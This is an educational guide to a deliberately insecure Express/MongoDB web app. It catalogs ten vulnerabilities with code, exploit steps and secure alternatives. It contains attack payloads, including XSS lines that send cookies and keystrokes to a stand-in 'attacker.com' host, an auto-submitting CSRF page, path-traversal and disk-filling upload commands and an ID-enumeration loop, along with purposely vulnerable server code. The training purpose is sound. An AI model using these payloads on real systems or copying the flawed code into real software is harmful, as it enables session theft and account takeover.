# 🔓 Insecure WebApp - Vulnerabilities Guide

## Purpose

This guide documents all intentional security vulnerabilities in the Insecure WebApp for **educational purposes only**. Each vulnerability is highlighted with specific code examples and explanations.

---

## 📋 Vulnerability List

| # | Vulnerability | Severity | CWE | Location |
|---|---|---|---|---|
| 1 | Plain Text Password Storage | 🔴 Critical | CWE-256 | server.js (Line 79-87) |
| 2 | Missing Input Validation | 🔴 Critical | CWE-20 | server.js (All POST routes) |
| 3 | Cross-Site Scripting (XSS) | 🔴 Critical | CWE-79 | dashboard.html, profile.html |
| 4 | Missing Authentication | 🔴 Critical | CWE-306 | server.js (All endpoints) |
| 5 | NoSQL Injection | 🔴 Critical | CWE-943 | server.js (Line 153-163) |
| 6 | Insecure Session Management | 🔴 Critical | CWE-384 | server.js (Line 22-27) |
| 7 | Unrestricted File Upload | 🔴 Critical | CWE-434 | server.js (Line 128-140) |
| 8 | Information Disclosure | 🟠 High | CWE-209 | server.js (Error handling) |
| 9 | Missing CSRF Protection | 🟠 High | CWE-352 | HTML forms |
| 10 | Hardcoded Credentials | 🟠 High | CWE-798 | server.js (Line 11, 22) |

---

## 1️⃣ Plain Text Password Storage

### ⚠️ Severity: CRITICAL

### Code Location

**File**: `server.js` (Lines 79-87)

```javascript
// ⚠️ INTENTIONALLY INSECURE: No password hashing
app.post('/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;
    
    const user = new User({
      username: username,
      email: email,
      password: password // ⚠️ NO HASHING - STORED AS PLAIN TEXT
    });

    await user.save();
    res.json({ success: true, message: 'User registered successfully' });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});
```

### What's Wrong?

- Passwords stored in plain text in MongoDB
- If database is compromised, all user passwords are exposed
- No ability to recover if attacker gains database access
- User passwords visible in database queries

### How to Exploit

```javascript
// Connect to MongoDB
db.users.find({ username: "john" }).pretty()

Output:
{
  "_id": ObjectId(...),
  "username": "john",
  "email": "john@example.com",
  "password": "mypassword123"  // ⚠️ Plain text!
}
```

### Impact

🔴 **CRITICAL**: Complete compromise of user accounts

### Secure Alternative

```javascript
const bcrypt = require('bcrypt');

// During registration:
const hashedPassword = await bcrypt.hash(password, 10);
const user = new User({
  username: username,
  email: email,
  password: hashedPassword  // ✅ HASHED
});

// During login:
const isPasswordValid = await bcrypt.compare(password, user.password);
```

### CWE Reference

[CWE-256: Unprotected Storage of Credentials](https://cwe.mitre.org/data/definitions/256.html)

---

## 2️⃣ Missing Input Validation

### ⚠️ Severity: CRITICAL

### Code Location

**File**: `server.js` (Lines 78-87, 105-119, etc.)

```javascript
app.post('/register', async (req, res) => {
  try {
    // ⚠️ NO VALIDATION
    const { username, email, password } = req.body;
    
    // Directly used without checking:
    // - Empty strings
    // - Duplicate usernames
    // - Invalid email format
    // - Weak passwords
    // - Very long strings
    
    const user = new User({
      username: username,  // ⚠️ Could be empty, SQL injection, etc.
      email: email,        // ⚠️ No email validation
      password: password   // ⚠️ No strength requirements
    });

    await user.save();
    res.json({ success: true, message: 'User registered successfully' });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});
```

### Tests

1. **Empty Username**
   ```bash
   curl -X POST http://localhost:3000/register \
     -H "Content-Type: application/json" \
     -d '{"username":"","email":"test@test.com","password":"123"}'
   ```

2. **Very Long String**
   ```bash
   "username": "aaaaaaa...aaaa" (10MB of data)
   ```

3. **Special Characters**
   ```bash
   "username": "<script>alert('XSS')</script>"
   "email": "test@test.com<img src=x onerror=alert('xss')>"
   ```

### Impact

🔴 **CRITICAL**: Data corruption, XSS, injection attacks, DoS

### Secure Alternative

```javascript
const { body, validationResult } = require('express-validator');

app.post('/register', [
  body('username').trim().isLength({ min: 3, max: 20 }).isAlphanumeric(),
  body('email').isEmail(),
  body('password').isLength({ min: 8 }).matches(/[A-Z]/).matches(/[0-9]/)
], async (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // Process validated input
});
```

### CWE Reference

[CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)

---

## 3️⃣ Cross-Site Scripting (XSS)

### ⚠️ Severity: CRITICAL

### Code Location

**File**: `dashboard.html` (Lines 87-97)

```html
<!-- ⚠️ INSECURE: Post content rendered as HTML -->
<div class="post-content">
  ${post.content}  <!-- If content has <script>, it executes! -->
</div>
```

**JavaScript Implementation** (Line 140-145):
```javascript
html += `
  <div class="post-card">
    <h3>${post.title}</h3>
    <div class="post-content">
      ${post.content}  <!-- ⚠️ NO SANITIZATION
    </div>
  </div>
`;
```

### How to Exploit

**Test #1: Alert Box**
1. Create post with content: `<img src=x onerror="alert('XSS')">`
2. View dashboard
3. Alert appears

**Test #2: Modify Page**
1. Create post with content: `<script>document.body.innerHTML = '<h1>HACKED</h1>'</script>`
2. Page content changes

**Test #3: Steal Cookies**
```javascript
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

**Test #4: Keylogger**
```javascript
<script>
document.addEventListener('keypress', (e) => {
  fetch('http://attacker.com/log?key=' + e.key);
});
</script>
```

### Impact

🔴 **CRITICAL**: Session hijacking, credential theft, malware distribution

### Secure Alternative

```javascript
// Method 1: Use textContent instead of innerHTML
html += `
  <div class="post-card">
    <h3>${post.title}</h3>
    <div class="post-content"></div>
  </div>
`;
const contentDiv = html.querySelector('.post-content');
contentDiv.textContent = post.content;  // ✅ Only text, no HTML

// Method 2: Use DOMPurify library
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.0/dist/purify.min.js"></script>
<script>
const cleanContent = DOMPurify.sanitize(post.content);
document.querySelector('.post-content').innerHTML = cleanContent;
</script>
```

### CWE Reference

[CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

---

## 4️⃣ Missing Authentication

### ⚠️ Severity: CRITICAL

### Code Location

**File**: `server.js` (Lines 109-120)

```javascript
// ⚠️ NO AUTHENTICATION CHECK
app.get('/profile/:userId', async (req, res) => {
  try {
    // Anyone can access any user profile!
    const user = await User.findById(req.params.userId);
    if (user) {
      res.json(user);  // Returns password, email, etc.!
    }
  } catch (err) {
    res.json({ error: err.message });
  }
});
```

### How to Exploit

```bash
# Without authentication, get any user's profile
curl http://localhost:3000/profile/607f1f77bcf86cd799439011
curl http://localhost:3000/profile/607f1f77bcf86cd799439012
# Just iterate through IDs!
```

**Using Browser DevTools:**
1. User A registers with ID: `abc123...`
2. User B changes localStorage userId to: `fed987...`
3. User B accesses User A's profile without permission

### Test Code

```javascript
// Get all user IDs by enumerating
for (let i = 0; i < 1000; i++) {
  const fakeId = ObjectId.from(i);
  fetch(`/profile/${fakeId}`)
    .then(r => r.json())
    .then(d => {
      if (!d.error) {
        console.log('Found user:', d.username);
      }
    });
}
```

### Impact

🔴 **CRITICAL**: Unauthorized data access, privacy violation

### Secure Alternative

```javascript
// Add authentication middleware
const requireAuth = (req, res, next) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  next();
};

// Require auth and check authorization
app.get('/profile/:userId', requireAuth, async (req, res) => {
  // Only allow viewing own profile or admin
  if (req.session.userId !== req.params.userId && !req.session.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  const user = await User.findById(req.params.userId);
  res.json(user);
});
```

### CWE Reference

[CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)

---

## 5️⃣ NoSQL Injection

### ⚠️ Severity: CRITICAL

### Code Location

**File**: `server.js` (Lines 153-163)

```javascript
app.get('/search', async (req, res) => {
  try {
    const query = req.query.q;
    
    // ⚠️ INSECURE: Direct regex on user input
    const results = await Post.find({
      $or: [
        { title: { $regex: query, $options: 'i' } },
        { content: { $regex: query, $options: 'i' } },
        { username: { $regex: query, $options: 'i' } }
      ]
    });

    res.json(results);
  } catch (err) {
    res.json({ error: err.message });
  }
});
```

### How to Exploit

**Test #1: Retrieve All Posts**
```bash
curl "http://localhost:3000/search?q=.*"
# Returns all posts due to regex match
```

**Test #2: Regex Denial of Service (ReDoS)**
```bash
curl "http://localhost:3000/search?q=(a+)+b"
# Causes regex engine to hang
```

**Test #3: If using string concatenation (more dangerous):**
```bash
# Not directly vulnerable in this code, but shows injection concept
curl "http://localhost:3000/search?q=test' || '1'=='1"
```

### More Dangerous Example (String Based)

```javascript
// ⚠️ If the code was:
const query = "SELECT * FROM posts WHERE title LIKE '%" + req.query.q + "%'";
// Attacker could inject: " OR '1'='1
```

### Impact

🔴 **CRITICAL**: Unauthorized data access, DoS attacks

### Secure Alternative

```javascript
app.get('/search', async (req, res) => {
  try {
    const query = req.query.q;
    
    // Validate and escape input
    if (typeof query !== 'string' || query.length > 100) {
      return res.status(400).json({ error: 'Invalid query' });
    }
    
    // Use proper escaping
    const escapedQuery = query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    
    const results = await Post.find({
      $or: [
        { title: { $regex: escapedQuery, $options: 'i' } },
        { content: { $regex: escapedQuery, $options: 'i' } },
        { username: { $regex: escapedQuery, $options: 'i' } }
      ]
    });

    res.json(results);
  } catch (err) {
    res.status(500).json({ error: 'Search failed' });
  }
});
```

### CWE Reference

[CWE-943: Improper Neutralization of Special Elements in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html)

---

## 6️⃣ Insecure Session Management

### ⚠️ Severity: CRITICAL

### Code Location

**File**: `server.js` (Lines 22-27)

```javascript
// ⚠️ INSECURE: Hardcoded secret, no secure flags
app.use(session({
  secret: 'super-secret-key',  // ⚠️ HARDCODED
  resave: false,
  saveUninitialized: true
  // Missing: secure, httpOnly, sameSite
}));

// Login endpoint
app.post('/login', async (req, res) => {
  // ...
  req.session.userId = user._id;  // ⚠️ Stored in-memory, no encryption
  req.session.username = user.username;
  res.json({ success: true, message: 'Login successful' });
});
```

### How to Exploit

**Test #1: Session Fixation**
```javascript
// Set session in browser before login
localStorage.setItem('sessionId', 'known-session-id');
// If using URL-based sessions, force user to login with your session
```

**Test #2: Session Hijacking**
```javascript
// Access localStorage
console.log(localStorage.getItem('userId'));  // ⚠️ Not sessions, but equally bad
// Send session cookie to attacker
```

**Test #3: Timing Attack on Session**
- Session doesn't have expiration
- Sessions live indefinitely

### Impact

🔴 **CRITICAL**: Account takeover, unauthorized access

### Secure Alternative

```javascript
const crypto = require('crypto');
require('dotenv').config();

app.use(session({
  secret: process.env.SESSION_SECRET,  // ✅ From environment
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,       // ✅ HTTPS only
    httpOnly: true,     // ✅ No JavaScript access
    sameSite: 'strict', // ✅ CSRF protection
    maxAge: 3600000     // ✅ 1 hour expiration
  },
  store: new MongoStore({
    collection: 'sessions'  // ✅ Persistent storage
  })
}));
```

### CWE Reference

[CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)

---

## 7️⃣ Unrestricted File Upload

### ⚠️ Severity: CRITICAL

### Code Location

**File**: `server.js` (Lines 128-140)

```javascript
const upload = multer({ 
  storage: storage 
  // ⚠️ NO FILE TYPE, SIZE, OR NAME VALIDATION
});

app.post('/upload', upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.json({ success: false, error: 'No file uploaded' });
    }

    // ⚠️ Any file type accepted!
    const image = new Image({
      userId: req.body.userId,
      filename: req.file.filename,  // ⚠️ Original filename used
      path: `/uploads/${req.file.filename}`
    });

    await image.save();
    res.json({ success: true, path: `/uploads/${req.file.filename}` });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});
```

### How to Exploit

**Test #1: Upload Executable**
```bash
# Upload .exe file instead of image
curl -F "image=@malware.exe" http://localhost:3000/upload
```

**Test #2: Upload Malicious Script**
```bash
# Upload .php, .sh, or other executable
curl -F "image=@shell.php" http://localhost:3000/upload
```

**Test #3: Path Traversal**
```
Filename: ../../admin/panel.html
Results in: uploads/../../admin/panel.html (overwrites admin file)
```

**Test #4: Large File DoS**
```bash
# Upload huge file to consume disk space
dd if=/dev/zero bs=1M count=5000 | curl -F "image=@file" http://localhost:3000/upload
```

### Impact

🔴 **CRITICAL**: Remote code execution, DoS, malware distribution

### Secure Alternative

```javascript
const multer = require('multer');
const fileType = require('file-type');
const path = require('path');

const fileFilter = (req, file, cb) => {
  // ✅ Whitelist allowed types
  const allowedMimeTypes = ['image/jpeg', 'image/png', 'image/gif'];
  
  if (allowedMimeTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Invalid file type'), false);
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024  // ✅ 5MB limit
  }
});

app.post('/upload', upload.single('image'), async (req, res) => {
  // ✅ Verify actual file type
  const type = await fileType.fromFile(req.file.path);
  
  if (!type || !allowedMimeTypes.includes(type.mime)) {
    fs.unlinkSync(req.file.path);
    return res.json({ success: false, error: 'Invalid file' });
  }
  
  // ✅ Rename to prevent directory traversal
  const newFilename = crypto.randomBytes(16).toString('hex') + path.extname(req.file.originalname);
  
  // Process image...
});
```

### CWE Reference

[CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---

## 8️⃣ Information Disclosure

### ⚠️ Severity: HIGH

### Code Location

**File**: `server.js` (Various error handlers)

```javascript
// ⚠️ INSECURE: Detailed error messages sent to client
app.post('/register', async (req, res) => {
  try {
    // ...
  } catch (err) {
    res.json({ success: false, error: err.message });  // ⚠️ Full error exposed!
  }
});

// Example error messages leaked:
// "E11000 duplicate key error collection: insecure-webapp.users..."
// "MongoServerError: connection refused"
// Stack traces showing file paths, line numbers, etc.
```

### How to Exploit

```javascript
// Error messages reveal:
// 1. Technology stack (MongoDB, Express)
// 2. Database schema
// 3. File paths
// 4. Internal logic
// 5. Potential injection points

// Example:
// POST /register with malicious input
// Response: "E11000 duplicate key error ... index: username_1"
// Attacker learns: usernames are indexed, structure of DB
```

### Impact

🟠 **HIGH**: Information leakage helps attackers craft better attacks

### Secure Alternative

```javascript
// ✅ Generic error messages in production
app.post('/register', async (req, res) => {
  try {
    // Validation and registration logic...
  } catch (err) {
    // Log actual error internally
    console.error('Registration error:', err);
    
    // Send generic message to client
    res.status(500).json({ 
      success: false, 
      error: 'Registration failed. Please try again.' 
    });
  }
});

// ✅ Better error handling
if (process.env.NODE_ENV === 'production') {
  app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Internal server error' });
  });
}
```

### CWE Reference

[CWE-209: Information Exposed Through an Error Message](https://cwe.mitre.org/data/definitions/209.html)

---

## 9️⃣ Missing CSRF Protection

### ⚠️ Severity: HIGH

### Code Location

**File**: `dashboard.html`, `profile.html` (ALL forms)

```html
<!-- ⚠️ NO CSRF TOKEN -->
<form id="editProfileForm">
  <input type="text" id="profileUsername" required>
  <button type="submit">Update Profile</button>
</form>

<!-- attacker.html on different domain -->
<form action="http://localhost:3000/profile/update" method="POST">
  <input type="hidden" name="userId" value="123">
  <input type="hidden" name="username" value="hacker">
  <input type="submit">
</form>
```

### How to Exploit

**Attack Scenario:**
1. Victim is logged into legitimate site
2. Victim visits attacker's website (in another tab)
3. Attacker's website contains hidden CSRF form
4. Form auto-submits, using victim's session
5. Victim's profile gets updated without knowing!

### Test CSRF

```html
<!-- csrf-test.html (on different domain) -->
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:3000/profile/update" method="POST">
  <input type="hidden" name="userId" value="attacker-id">
  <input type="hidden" name="username" value="hacked">
</form>
</body>
</html>
```

### Impact

🟠 **HIGH**: Unauthorized actions performed on behalf of user

### Secure Alternative

```javascript
// ✅ Backend: Use csrf middleware
const csrf = require('csurf');

app.use(csrf({ cookie: false }));

app.get('/dashboard', (req, res) => {
  res.send(`
    <form method="POST" action="/profile/update">
      <input type="hidden" name="_csrf" value="${req.csrfToken()}">
      <input type="text" name="username">
      <button type="submit">Update</button>
    </form>
  `);
});

app.post('/profile/update', (req, res) => {
  // ✅ Token automatically verified
  // ...
});
```

### CWE Reference

[CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)

---

## 🔟 Hardcoded Credentials

### ⚠️ Severity: HIGH

### Code Location

**File**: `server.js` (Lines 11, 22)

```javascript
// ⚠️ HARDCODED: Session secret visible in source code
const app = express();

app.use(session({
  secret: 'super-secret-key',  // ⚠️ HARDCODED IN SOURCE
  resave: false,
  saveUninitialized: true
}));

// ⚠️ HARDCODED: MongoDB URI
const MONGODB_URI = 'mongodb://mongo:27017/insecure-webapp';
```

### Risks

1. **Source Code Exposure** - Credentials visible in GitHub, backups, etc.
2. **Insider Threats** - Any team member has credentials
3. **Accidental Disclosure** - Credentials in logs, screenshots, etc.
4. **Supply Chain Attacks** - If code is shared/forked

### How to Exploit

```bash
# Attacker clones repository
git clone https://github.com/user/insecure-webapp.git

# Finds credentials in code
grep -r "secret\|password\|mongodb" . 

# Gets database access!
mongo mongodb://mongo:27017/insecure-webapp
```

### Impact

🟠 **HIGH**: Complete system compromise if credentials leaked

### Secure Alternative

```javascript
// ✅ Use environment variables
require('dotenv').config();

const app = express();

app.use(session({
  secret: process.env.SESSION_SECRET,  // ✅ From .env
  resave: false,
  saveUninitialized: true
}));

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/insecure-webapp';

// .env file (NOT in git)
SESSION_SECRET=your-super-secret-key-here
MONGODB_URI=mongodb://mongo:27017/insecure-webapp
```

```
// .gitignore
.env
.env.local
.env.*.local
```

### CWE Reference

[CWE-798: Use of Hard-Coded Credentials](https://cwe.mitre.org/data/definitions/798.html)

---

## 📊 Vulnerability Summary

| # | Vulnerability | Location | How to Test | Impact |
|---|---|---|---|---|
| 1 | Plain Text Passwords | server.js:79 | Query MongoDB directly | Account compromise |
| 2 | No Input Validation | server.js:78+ | Send malicious input | Injection attacks |
| 3 | XSS | dashboard.html:140 | Create post with `<script>` | Session hijacking |
| 4 | Missing Auth | server.js:109 | Access /profile without login | Data breach |
| 5 | NoSQL Injection | server.js:153 | Search with `.*` regex | Data theft |
| 6 | Bad Sessions | server.js:22 | Change localStorage | Account takeover |
| 7 | File Upload | server.js:128 | Upload .exe or large file | RCE/DoS |
| 8 | Info Disclosure | server.js:errors | Trigger errors | Reconnaissance |
| 9 | No CSRF | profile.html | Cross-site form attack | Data modification |
| 10 | Hardcoded Creds | server.js:11,22 | Read source code | System breach |

---

## 🎓 Learning Checklist

- [ ] Understand each vulnerability
- [ ] Reproduce each exploit
- [ ] Understand the impact
- [ ] Know the secure alternative
- [ ] Can explain to others
- [ ] Would not repeat in production code

---

**Remember: Education is the best defense! 🛡️**

